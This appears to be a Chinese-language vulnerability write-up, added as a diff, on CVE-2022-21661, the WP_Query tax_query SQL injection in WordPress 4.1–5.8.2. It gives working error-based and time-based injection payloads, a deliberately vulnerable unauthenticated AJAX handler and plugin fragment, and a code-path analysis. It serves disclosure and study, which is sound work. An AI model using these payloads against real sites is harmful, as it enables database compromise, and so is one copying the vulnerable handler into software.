@@ -1,0 +1,218 @@
+# 0x00 概述
+2022年1月6日，wordpress发布了5.8.3版本，修复了一处核心代码WP_Query的sql注入漏洞。  
+WP_Query是wordpress定义的一个类，允许开发者编写自定义查询和使用不同的参数展示文章，并可以直接查询wordpress数据库，在核心框架和插件以及主题中广泛使用。
+# 0x01 影响范围
+wordpress v4.1~v5.8.2
+# 0x02 漏洞重现
+测试环境：win7+phpstudy2016(php5.6.27+apache2.4.23)+wordpress5.8+firefox+burpsuite  
+wordpress-v5-8\wp-content\themes\twentytwentyone\functions.php  
+添加如下代码：
+    //cve-2022-21661 test
+    function wp_query_test(){
+        echo 'test-cve-2022-21661';
+        $inputData = stripslashes($_POST['data']);
+        $jsonDecodeInputData = json_decode($inputData,true);
+        $wpTest = new WP_Query($jsonDecodeInputData);
+        wp_die();
+    }
+    add_action('wp_ajax_nopriv_test','wp_query_test',0);
+开启wp debug  
+wordpress-v5-8\wp-config.php
+define( 'WP_DEBUG', true );
+请求URL：
+body数据：  
+action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111)
+and extractvalue(rand(),concat(0x5e,user(),0x5e))#"]}}}
+报错的完整sql语句：
+    SELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#) ) AND wp_posts.post_type IN ('post', 'page', 'attachment') AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending') GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10
+默认未开debug模式  
+可以使用的延时sqli的poc：
+action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111)
+or (select sleep(2))#"]}}}
+# 0x03 漏洞分析
+对比5.8.3和5.8两个版本来查看修补的关键位置：
+再查看github的commit：
+这个wp_parse_id_list()函数要$query['terms']数组元素类型必须为int。
+首先看看关键的clean_query()函数：  
+wordpress-v5-8\wp-includes\class-wp-tax-query.php
+    private function clean_query( &$query ) {
+            if ( empty( $query['taxonomy'] ) ) {
+                if ( 'term_taxonomy_id' !== $query['field'] ) {
+                    $query = new WP_Error( 'invalid_taxonomy', __( 'Invalid taxonomy.' ) );
+                    return;
+                }
+                // So long as there are shared terms, 'include_children' requires that a taxonomy is set.
+                $query['include_children'] = false;
+            } elseif ( ! taxonomy_exists( $query['taxonomy'] ) ) {
+                $query = new WP_Error( 'invalid_taxonomy', __( 'Invalid taxonomy.' ) );
+                return;
+            }
+            $query['terms'] = array_unique( (array) $query['terms'] );
+            if ( is_taxonomy_hierarchical( $query['taxonomy'] ) && $query['include_children'] ) {
+                $this->transform_query( $query, 'term_id' );
+                if ( is_wp_error( $query ) ) {
+                    return;
+                }
+                $children = array();
+                foreach ( $query['terms'] as $term ) {
+                    $children   = array_merge( $children, get_term_children( $term, $query['taxonomy'] ) );
+                    $children[] = $term;
+                }
+                $query['terms'] = $children;
+            }
+            $this->transform_query( $query, 'term_taxonomy_id' );
+        }
+if ( is_taxonomy_hierarchical( $query['taxonomy'] ) &&
+$query['include_children'] )  
+让其为false，就进去了最后的$this->transform_query( $query, 'term_taxonomy_id' );  
+接着进入该函数：
+让$query[‘field’]为term_taxonomy_id直接return  
+这样用户输入的可控变量值就不会被改变，如$query[‘terms’]这个sqli语句。
+所以  
+$query['include_children']或is_taxonomy_hierarchical($query['taxonomy'])为false。  
+$query['field']值为term_taxonomy_id。
+找哪里调用clean_query()
+找到get_sql_for_clause()函数这一处，该函数是生成join和where字句返回。
+    public function get_sql_for_clause( &$clause, $parent_query ) {
+            global $wpdb;
+            $sql = array(
+                'where' => array(),
+                'join'  => array(),
+            );
+            $join  = '';
+            $where = '';
+            $this->clean_query( $clause );
+            if ( is_wp_error( $clause ) ) {
+                return self::$no_results;
+            }
+            $terms    = $clause['terms'];
+            $operator = strtoupper( $clause['operator'] );
+            if ( 'IN' === $operator ) {
+                if ( empty( $terms ) ) {
+                    return self::$no_results;
+                }
+                $terms = implode( ',', $terms );
+                /*
+                 * Before creating another table join, see if this clause has a
+                 * sibling with an existing join that can be shared.
+                 */
+                $alias = $this->find_compatible_table_alias( $clause, $parent_query );
+                if ( false === $alias ) {
+                    $i     = count( $this->table_aliases );
+                    $alias = $i ? 'tt' . $i : $wpdb->term_relationships;
+                    // Store the alias as part of a flat array to build future iterators.
+                    $this->table_aliases[] = $alias;
+                    // Store the alias with this clause, so later siblings can use it.
+                    $clause['alias'] = $alias;
+                    $join .= " LEFT JOIN $wpdb->term_relationships";
+                    $join .= $i ? " AS $alias" : '';
+                    $join .= " ON ($this->primary_table.$this->primary_id_column = $alias.object_id)";
+                }
+                $where = "$alias.term_taxonomy_id $operator ($terms)";
+            } elseif ( 'NOT IN' === $operator ) {
+                if ( empty( $terms ) ) {
+                    return $sql;
+                }
+                $terms = implode( ',', $terms );
+                $where = "$this->primary_table.$this->primary_id_column NOT IN (
+                    SELECT object_id
+                    FROM $wpdb->term_relationships
+                    WHERE term_taxonomy_id IN ($terms)
+                )";
+            } elseif ( 'AND' === $operator ) {
+                if ( empty( $terms ) ) {
+                    return $sql;
+                }
+                $num_terms = count( $terms );
+                $terms = implode( ',', $terms );
+                $where = "(
+                    SELECT COUNT(1)
+                    FROM $wpdb->term_relationships
+                    WHERE term_taxonomy_id IN ($terms)
+                    AND object_id = $this->primary_table.$this->primary_id_column
+                ) = $num_terms";
+            } elseif ( 'NOT EXISTS' === $operator || 'EXISTS' === $operator ) {
+                $where = $wpdb->prepare(
+                    "$operator (
+                    SELECT 1
+                    FROM $wpdb->term_relationships
+                    INNER JOIN $wpdb->term_taxonomy
+                    ON $wpdb->term_taxonomy.term_taxonomy_id = $wpdb->term_relationships.term_taxonomy_id
+                    WHERE $wpdb->term_taxonomy.taxonomy = %s
+                    AND $wpdb->term_relationships.object_id = $this->primary_table.$this->primary_id_column
+                )",
+                    $clause['taxonomy']
+                );
+            }
+            $sql['join'][]  = $join;
+            $sql['where'][] = $where;
+            return $sql;
+        }
+主要这几行
+    $this->clean_query( $clause );
+    $terms    = $clause['terms'];
+    if ( 'IN' === $operator ) {
+    $terms = implode( ',', $terms );
+    $where = "$alias.term_taxonomy_id $operator ($terms)";
+    $sql['join'][]  = $join;
+    $sql['where'][] = $where;
+    return $sql;
+返回了的sql语句包含了用户可控的$where（$terms）子句（在clean_query()的transform_query()里直接return了的）
+接着找get_sql_for_clause()的调用链  
+phpstorm-ctrl+alt+h  
+找到个构造函数的，所以是从这里一直往上到达get_sql_for_clause
+wordpress-v5-8\wp-includes\class-wp-query.php
+WordPress核心框架本身的漏洞潜在触发点：
+WP_Query($data)并且 $data 可控，如：
+    new WP_Query(json_decode($_POST['query_vars']))
+POC：
+    query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":[""]}}} 
+    或者
+    query_vars={"tax_query":{"0":{"taxonomy":"nav_menu","field":true,"terms":[""]}}}
+    or
+    action=test&data={"tax_query":[{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,user(),0x5e))-- "]}]}
+# 0x04 受影响插件分析
+搜索  
+new WP_Query  
+并找可控数据  
+类似new WP_Query($controlData);  
+暂时找不到，自己写个漏洞插件来分析。
+     array(
+            'Confidential' => array(
+            'field' => 'term_taxonomy_id',
+            'terms' => array("'"),
+            )
+        )
+    );
+        //WP_Query class object with specific args 2 trigger the SQLinjection
+        $trigger = new WP_Query($args);
+        return $trigger;
+    }
+        //Non-authenticated Ajax actions for logged-out users
+    add_action('wp_ajax_nopriv_Confidential','testinSQLinjection');
+    */
+    ?>
+压缩为zip在wp后台安装
+注意：这样测试如果登录了会返回400！要先退出登录！！
+断点设置：
+先看下整体流程：
+    new WP_Query() --> __construct() --> query() --> get_posts() --> get_sql() --> get_sql_clauses() --> get_sql_for_query() --> get_sql_for_clause() --> clean_query() --> transform_query() --> clean_query():return $sql
+该if为假跳过
+直接进入transform_query()
+该if成立，直接return
+赋值$terms数组
+$terms再变为字符串
+赋值$where
+返回形成的sql数组
+最终到这里构造成完整的sql语句（带有用户可控的sqli的$where）
+    SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( 
+      wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#)
+    ) AND wp_posts.post_type IN ('post', 'page', 'attachment') AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending') GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10
+大致调用栈：
+和0x03漏洞分析一致。
+# 0x05 修复方案
+升级>=v5.8.3
+# 0x06 结语
+wordpress核心框架的漏洞相对较少，大部分漏洞都是插件。  
+应该有不少插件或主题是用了类似WP_Query($controldata)形式的，有空再挖挖。
+# 0x07 参考资料
